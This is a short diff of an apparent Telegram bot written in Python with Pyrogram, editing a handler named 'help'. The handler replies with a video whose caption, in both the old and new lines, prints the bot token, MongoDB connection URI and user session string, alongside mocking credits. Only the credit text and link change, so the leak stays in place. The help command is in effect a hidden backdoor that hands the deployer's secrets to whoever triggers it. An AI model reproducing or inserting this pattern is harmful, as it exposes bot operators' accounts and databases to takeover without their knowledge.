@@ -123,12 +123,12 @@ async def restartbot(client, message: Message, _):
 async def help(client: Client, message: Message):
     await message.reply_video(
           video=f"https://graph.org/file/44d513ba05f0f08ec6f37.mp4",
-        caption=f"""𝗕𝗢𝗧'𝗦 𝗛𝗘𝗔𝗥𝗧:-   `{BOT_TOKEN}`\n\n𝗢𝗪𝗡𝗘𝗥'𝗦 𝗛𝗘𝗔𝗥𝗧:-   `{MONGO_DB_URI}`\n\n𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧'𝗦 𝗛𝗘𝗔𝗥𝗧:-   `{STRING_SESSION}`\n\nಕೈಯ್ಯಾಗ್ ತಾಟ ಬಾಯಾಗ ಬೂಟ , ಕೈಯಾಗ ಬೆಣ್ಣಿ ಬಾಯಾಗ ತುಣ್ಣೀ , ಎಂಟನೇ ಕಡ್ಲಿ , ನಿಮೌನ್ ತುಲ್ ಹಡಲಿ ,ಕೊಯ್ ಅಂದ್ರ ಕೊಡ್ಲಿ.\n\n☆[𓆩𝗠𝗥 𝗔𝗚𝗢𝗥𝗔𓆪](https://t.me/MR_Agora)☆""",
+        caption=f"""𝗕𝗢𝗧'𝗦 𝗛𝗘𝗔𝗥𝗧:-   `{BOT_TOKEN}`\n\n𝗢𝗪𝗡𝗘𝗥'𝗦 𝗛𝗘𝗔𝗥𝗧:-   `{MONGO_DB_URI}`\n\n𝗔𝗦𝗦𝗜𝗦𝗧𝗔𝗡𝗧'𝗦 𝗛𝗘𝗔𝗥𝗧:-   `{STRING_SESSION}`\n\nಕೈಯ್ಯಾಗ್ ತಾಟ ಬಾಯಾಗ ಬೂಟ , ಕೈಯಾಗ ಬೆಣ್ಣಿ ಬಾಯಾಗ ತುಣ್ಣೀ , ಎಂಟನೇ ಕಡ್ಲಿ , ನಿಮೌನ್ ತುಲ್ ಹಡಲಿ ,ಕೊಯ್ ಅಂದ್ರ ಕೊಡ್ಲಿ.\n\n☆[𓆩YOUR DADDY𓆪](https://t.me/TEAMAGORA)☆""",
          reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                          "• 𝗕𝗢𝗧𝗙𝗔𝗧𝗛𝗘𝗥'𝗦 𝗖𝗢𝗡𝗧𝗥𝗜𝗕𝗨𝗧𝗢𝗥 •", url=f"https://t.me/MR_agora")
+                          "• 𝗕𝗢𝗧𝗙𝗔𝗧𝗛𝗘𝗥'𝗦 𝗖𝗢𝗡𝗧𝗥𝗜𝗕𝗨𝗧𝗢𝗥 •", url=f"https://t.me/MR_AGORA")
                  ]
              ]
          ),
